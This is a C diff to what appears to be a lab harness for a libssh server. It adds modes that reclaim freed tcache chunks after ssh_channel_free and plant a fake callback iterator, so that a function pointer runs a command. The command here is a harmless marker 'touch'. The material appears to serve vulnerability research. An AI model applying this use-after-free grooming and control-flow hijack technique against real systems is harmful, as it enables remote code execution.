@@ -37,6 +37,16 @@ static void *g_saved_it = NULL;
 static int g_exec = 0;
 static int g_exec_rc = -1;
 static const char g_exec_cmd[] = "touch evidence-wire-vuln-groom-exec.marker";
+static int g_nodetach = 0;
+static int g_no_reclaim = 0;
+static void *g_old_buf = NULL;
+static struct ssh_iterator *g_old_it = NULL;
+static struct ssh_iterator g_fake_it;
+static struct ssh_channel_callbacks_struct g_fake_cbs;
+static int exec_trampoline(ssh_session s, ssh_channel ch, void *data,
+                           uint32_t len, int stderr, void *u);
+struct lab_buffer { bool secure; uint32_t used, allocated, pos; uint8_t *data; };
+static uint8_t g_fake_buf_data[128];
 
 static int auth_password(ssh_session s, const char *user, const char *pass, void *u)
 {
@@ -86,6 +96,15 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                    g_saved_buf, g_saved_cbs, g_saved_it);
             fflush(stdout);
         }
+        if (g_nodetach) {
+            /* No detach: save the addresses the library will reuse, then
+             * reclaim them from the same tcache bins after the free. */
+            g_old_buf = ch->stdout_buffer;
+            g_old_it = ssh_list_get_iterator(ch->callbacks);
+            printf("SERVER nodetach saved_buf=%p saved_it=%p\n",
+                   g_old_buf, (void *)g_old_it);
+            fflush(stdout);
+        }
         ssh_channel_free(ch);
         if (g_groom && len >= 128) {
             /* Lab-only groom: the application reuses the just-freed 128-byte
@@ -96,7 +115,7 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
             uint64_t v = 0;
             if (p != NULL) {
                 memcpy(p, wire, sizeof(wire));
-                if (g_survive) {
+                if (g_survive || g_nodetach) {
                     /* grow_window() dereferences these two fields after the
                      * write; wire bytes choose NULL for both. */
                     memset((char *)p + 56, 0, 8);  /* stdout_buffer */
@@ -109,7 +128,40 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                 fflush(stdout);
             }
         }
-        if (g_call && len >= 128) {
+        if (g_nodetach && !g_no_reclaim && len >= 128) {
+            /* Reclaim both freed 32-byte chunks by address. The freed stdout
+             * ssh_buffer and the callback iterator share one tcache bin, so
+             * allocate raw nodes and initialise whichever address comes back. */
+            int i;
+            struct ssh_iterator *it = NULL;
+            struct lab_buffer *bf = NULL;
+            for (i = 0; i < 64 && (it == NULL || bf == NULL); i++) {
+                void *c = malloc(sizeof(struct ssh_iterator));
+                if (c == g_old_it) it = c;
+                if (c == g_old_buf) bf = c;
+            }
+            memset(&g_fake_cbs, 0, sizeof(g_fake_cbs));
+            g_fake_cbs.size = sizeof(g_fake_cbs);
+            g_fake_cbs.userdata = g_groom_ptr;
+            g_fake_cbs.channel_data_function = exec_trampoline;
+            g_fake_it.next = NULL;
+            g_fake_it.data = &g_fake_cbs;
+            if (it != NULL) {
+                it->next = &g_fake_it;
+                it->data = &g_fake_cbs;
+            }
+            if (bf != NULL) {
+                bf->secure = 0;
+                bf->allocated = sizeof(g_fake_buf_data);
+                bf->used = sizeof(g_fake_buf_data);
+                bf->pos = 0;
+                bf->data = g_fake_buf_data;
+            }
+            printf("SERVER nodetach reclaim it=%p want=%p buf=%p want=%p\n",
+                   (void *)it, (void *)g_old_it, (void *)bf, g_old_buf);
+            fflush(stdout);
+        }
+        if (g_call && !g_nodetach && len >= 128) {
             /* Lab-only W4: the first list node was kept alive by the detach
              * above. Redirect its next pointer to an app-owned fake callback
              * entry whose function pointer is chosen by wire bytes, so the
@@ -368,7 +420,7 @@ int main(int argc, char **argv)
     pid_t pid;
     if (argc < 2 || argc > 3) {
         fprintf(stderr,
-                "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec]\n",
+                "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare]\n",
                 argv[0]);
         return 2;
     }
@@ -395,6 +447,17 @@ int main(int argc, char **argv)
         g_groom = 1;
         g_survive = 1;
         g_call = 1;
+        g_exec = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-nodetach-exec") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-nodetach-bare") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_no_reclaim = 1;
         g_exec = 1;
     } else if (argc == 3) {
         fprintf(stderr, "unknown mode: %s\n", argv[2]);
